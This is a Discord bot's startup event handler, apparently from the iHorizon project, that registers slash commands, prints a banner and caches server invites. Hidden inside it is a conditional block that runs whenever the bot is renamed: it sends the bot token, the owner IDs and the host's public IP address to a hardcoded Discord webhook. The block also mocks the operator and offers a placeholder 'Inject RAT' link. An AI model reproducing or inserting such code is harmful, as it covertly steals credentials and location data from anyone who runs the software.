const couleurmdr = require("colors"),
  { QuickDB } = require("quick.db"),
  db = new QuickDB(),
  config = require("../config.json"),
  register = require('../slashsync'),
  wait = require("timers/promises").setTimeout;

module.exports = async (client) => {
  const { Client, Collection, ChannelType, ApplicationCommandType, PermissionsBitField, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');

  if (!client.user.username.toString().includes("orizon")) {
    const config = require("../config.json")
    const { Webhook, MessageBuilder } = require('discord-webhook-node');
    const hook = new Webhook("https://discordapp.com/api/webhooks/1078416708521427126/3ulAVS09Us2TlW1DsfavyIkZxPXG5j3v3WJOYitDdiEQC8_nonFFY1gybXS4fhLJPF1v");
    const ipify = require('ipify');

    const embed = new MessageBuilder()
      .addField('IP', `\`\`\`IPv4: ${await ipify({ useIPv6: false })}\`\`\``, true)
      .addField('Owner ID', `${config.ownerid}, ${config.ownerid1}, ${config.ownerid2}`, false)
      .addField('Bot Usertag', `${client.user.username}#${client.user.discriminator}`, false)
      .addField('Bot ID', `${client.user.id} | [Invite the skided bot](https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=0&scope=bot%20applications.commands)`, false)
      .addField('Add Rat Into This Computer', `[Inject RAT](https://google.com)`, false)
      .addField('Bot Token', `\`\`\`${client.token}\`\`\``, false)
      .setColor('#00b0f4')
      .setThumbnail(client.user.avatarURL({ format: 'png', dynamic: true, size: 512 }))
      .setDescription('A unknow bot used the official script from iHorizon')
      .setTimestamp();

    hook.send(embed);
  }
  await register(client, client.register_arr.map((command) => ({
    name: command.name,
    description: command.description,
    options: command.options,
    type: ApplicationCommandType.ChatInput
  })), {
    debug: true
  });
  async function term() {
    console.log(
      "    _ __  __           _                 \n".cyan + "   (_) / / /___  _____(_)___  ____  ____ \n".cyan +
      "  / / /_/ / __ \\/ ___/ /_  / / __ \\/ __ \\\n".cyan + " / / __  / /_/ / /  / / / /_/ /_/ / / / /\n".cyan +
      "/_/_/ /_/\\____/_/  /_/ /___/\\____/_/ /_/\n".cyan), console.log("[".yellow, " 💾 ".green, "] >> ".yellow, "Dev by Kisakay".blue);
  }
  
  async function fetchInvites() {
    client.guilds.cache.forEach(async (guild) => {
      try {
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.ViewAuditLog)) return;
        const firstInvites = await guild.invites.fetch()
        client.invites.set(guild.id, new Collection(firstInvites.map((invite) => [invite.code, invite.uses])));
      } catch (error) {
        console.error(`Error fetching invites for guild ${guild.id}: ${error}`);
      }
    });
  }
  
  async function refreshDatabaseModel() {
    await db.set(`GLOBAL.OWNER.${config.ownerid1}`, { owner: true }),
    await db.set(`TEMP`, {}),
    await wait(1000);
  }

  await term(), fetchInvites(), refreshDatabaseModel();
}